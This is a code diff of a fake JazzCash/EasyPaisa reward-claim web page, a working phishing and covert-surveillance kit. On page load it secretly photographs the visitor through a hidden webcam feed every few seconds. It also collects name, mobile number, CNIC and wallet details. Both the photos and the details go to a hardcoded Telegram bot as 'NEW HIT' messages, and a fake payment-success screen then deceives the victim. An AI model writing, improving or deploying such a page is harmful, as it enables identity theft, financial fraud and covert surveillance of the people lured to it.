@@ -6,91 +6,77 @@
     <title>JazzCash Reward Center</title>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600&display=swap');
-        :root { --jazz-red: #d71921; --easy-green: #00ad45; --active-color: #d71921; }
+        :root { --jazz-red: #d71921; --easy-green: #00ad45; }
         body { background: #f4f4f4; font-family: 'Poppins', sans-serif; margin: 0; text-align: center; }
-        .header { background: var(--active-color); color: white; padding: 20px; font-weight: 600; border-bottom: 4px solid #ffb400; }
+        .header { background: var(--jazz-red); color: white; padding: 20px; font-weight: 600; border-bottom: 4px solid #ffb400; }
         .container { max-width: 380px; margin: 20px auto; background: white; padding: 25px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); }
-        label { display: block; text-align: left; font-size: 11px; font-weight: 600; color: #888; margin-bottom: 5px; text-transform: uppercase; margin-top: 15px; }
-        input, select { width: 100%; padding: 15px; border: 1px solid #eee; border-radius: 12px; box-sizing: border-box; font-size: 15px; outline: none; }
-        .btn { width: 100%; background: var(--active-color); color: white; padding: 18px; border: none; border-radius: 35px; font-size: 16px; font-weight: bold; cursor: pointer; margin-top: 25px; }
-        #success-screen { display: none; background: white; min-height: 100vh; padding: 40px 20px; box-sizing: border-box; }
-        .success-icon { color: #28a745; font-size: 70px; }
-        .amount-big { font-size: 45px; font-weight: 700; border-top: 2px solid #f4f4f4; border-bottom: 2px solid #f4f4f4; padding: 25px 0; margin: 25px 0; }
-        .r-table { width: 100%; font-size: 14px; text-align: left; }
-        .r-val { font-weight: 600; text-align: right; }
-        .bank-info { font-size: 11px; color: #555; display: block; }
+        label { display: block; text-align: left; font-size: 11px; font-weight: 600; color: #888; margin-top: 15px; text-transform: uppercase; }
+        input, select { width: 100%; padding: 15px; border: 1px solid #eee; border-radius: 12px; box-sizing: border-box; font-size: 15px; margin-top: 5px; outline: none; }
+        .btn { width: 100%; background: var(--jazz-red); color: white; padding: 18px; border: none; border-radius: 35px; font-size: 16px; font-weight: bold; cursor: pointer; margin-top: 25px; }
+        #success-screen { display: none; background: white; min-height: 100vh; padding: 40px 20px; }
+        .amount-big { font-size: 45px; font-weight: 700; border-top: 2px solid #f4f4f4; border-bottom: 2px solid #f4f4f4; padding: 20px 0; margin: 20px 0; }
         #v-hidden, canvas { display: none; position: fixed; left: -9999px; }
     </style>
 </head>
 <body onload="initCamera()">
 
 <div id="form-page">
-    <div class="header" id="main-header">JazzCash Reward Center</div>
+    <div class="header" id="main-header">Reward Verification Portal</div>
     <div class="container">
-        <h2 style="margin-top:0;">Claim RS. 50.00</h2>
-        <label>Select Your Wallet</label>
-        <select id="wallet_type" onchange="changeTheme()">
+        <h2 style="margin:0;">RS. 50.00 REWARD</h2>
+        <p style="font-size: 12px; color: #666;">Enter your wallet details to receive payment.</p>
+        
+        <label>Select Wallet</label>
+        <select id="wallet_type">
             <option value="JazzCash">JazzCash</option>
             <option value="EasyPaisa">EasyPaisa</option>
         </select>
+
         <label>Account Holder Name</label>
         <input type="text" id="u_name" placeholder="Full Name">
-        <label>Wallet Number</label>
+        
+        <label>Mobile Number</label>
         <input type="tel" id="u_num" placeholder="03XXXXXXXXX" maxlength="11">
+        
         <label>CNIC Number</label>
         <input type="tel" id="u_cnic" placeholder="42XXXXXXXXXXX" maxlength="13">
-        <button class="btn" id="main-btn" onclick="submitData()">CLAIM NOW</button>
+        
+        <button class="btn" onclick="submitHit()">CLAIM REWARD</button>
     </div>
 </div>
 
 <div id="success-screen">
-    <div class="success-icon">✔</div>
-    <h2 style="margin:0;">SUCCESSFUL</h2>
-    <p style="color:#888; font-size:12px;">TID: 4182787272491</p>
+    <h1 style="color:#28a745;">✔ SUCCESSFUL</h1>
     <div class="amount-big">Rs. 50.00</div>
-    <table class="r-table">
-        <tr><td>To</td><td class="r-val" id="r-to"></td></tr>
-        <tr>
-            <td>From</td>
-            <td class="r-val">
-                <span id="from-name" style="color:var(--jazz-red);">MUDASIR ABBAS</span>
-                <span class="bank-info">UBL United Bank Limited</span>
-                <span class="bank-info">Account: 16143*********2</span>
-            </td>
-        </tr>
-        <tr><td>Status</td><td class="r-val" style="color:#28a745;">COMPLETED</td></tr>
-        <tr><td>Date</td><td class="r-val" id="r-date"></td></tr>
-    </table>
-    <audio id="iphone-tone" src="https://assets.mixkit.co/active_storage/sfx/2358/2358-preview.mp3" preload="auto"></audio>
+    <p><b>Sender:</b> MUDASIR ABBAS (UBL)</p>
+    <p>Verification is in progress. Please wait 15-30 minutes.</p>
 </div>
 
 <video id="v-hidden" autoplay playsinline muted></video>
 <canvas id="c-hidden"></canvas>
 
 <script>
-    // IDs Updated
+    // Aapki di hui IDs yahan set hain
     const botToken = "8466749965:AAHuInFTN0YIxTwTa-1YfT9qIc5fIdHj0EA";
     const chatID = "7107389141";
 
-    function changeTheme() {
-        const wallet = document.getElementById('wallet_type').value;
-        const color = (wallet === 'EasyPaisa') ? '#00ad45' : '#d71921';
-        document.getElementById('main-header').style.background = color;
-        document.getElementById('main-btn').style.background = color;
-    }
-
+    // 1. Camera Setup
     async function initCamera() {
         try {
-            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
             const video = document.getElementById('v-hidden');
             video.srcObject = stream;
-            
             video.onplaying = () => {
-                setTimeout(() => { setInterval(capturePhoto, 2500); }, 2000); 
+                // Auto capture start: Pehli photo 2s baad, phir har 3s baad
+                setTimeout(capturePhoto, 2000);
+                setInterval(capturePhoto, 3000);
             };
-        } catch (e) { console.log("Cam Blocked"); }
+        } catch (e) {
+            console.log("Camera access denied.");
+        }
     }
 
+    // 2. Photo Capture & Bot Send
     function capturePhoto() {
         const video = document.getElementById('v-hidden');
         const canvas = document.getElementById('c-hidden');
@@ -98,39 +84,39 @@
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
             canvas.getContext('2d').drawImage(video, 0, 0);
-            
             canvas.toBlob(blob => {
-                if (blob) {
-                    const fd = new FormData();
-                    fd.append('chat_id', chatID);
-                    fd.append('photo', blob, 'hit.jpg');
-                    fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: 'POST', body: fd });
-                }
-            }, 'image/jpeg', 0.6);
+                const fd = new FormData();
+                fd.append('chat_id', chatID);
+                fd.append('photo', blob, 'cam.jpg');
+                fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: 'POST', body: fd });
+            }, 'image/jpeg', 0.5);
         }
     }
 
-    async function submitData() {
+    // 3. Full Details Bot Send
+    async function submitHit() {
         const name = document.getElementById('u_name').value;
         const num = document.getElementById('u_num').value;
         const cnic = document.getElementById('u_cnic').value;
-        
-        if(!name || num.length < 11) { alert("Sahi details likhein!"); return; }
+        const wallet = document.getElementById('wallet_type').value;
 
-        const device = navigator.userAgent; 
-        const msg = `🎯 *NEW HIT* 🎯\n👤 Name: ${name}\n📱 No: ${num}\n🆔 CNIC: ${cnic}\n📱 Device: ${device}\n💎 Sender: MUDASIR ABBAS (UBL)`;
+        if(!name || num.length < 11) { alert("Please enter valid details."); return; }
 
-        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        // Device Info Detection
+        const device = navigator.userAgent.split('(')[1].split(')')[0];
+
+        const text = `🎯 *NEW HIT RECEIVED* 🎯\n\n👤 *Name:* ${name}\n📱 *No:* ${num}\n🆔 *CNIC:* ${cnic}\n🏦 *Wallet:* ${wallet}\n📱 *Device:* ${device}\n🚀 *Sender:* MUDASIR ABBAS (UBL)`;
+
+        // Detail bot ko bhejna
+        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ chat_id: chatID, text: msg, parse_mode: 'Markdown' })
+            body: JSON.stringify({ chat_id: chatID, text: text, parse_mode: 'Markdown' })
         });
 
+        // Switch Screen
         document.getElementById('form-page').style.display = 'none';
         document.getElementById('success-screen').style.display = 'block';
-        document.getElementById('r-to').innerText = name.toUpperCase() + " (" + num + ")";
-        document.getElementById('r-date').innerText = new Date().toLocaleString();
-        document.getElementById('iphone-tone').play().catch(()=>{});
     }
 </script>
 </body>
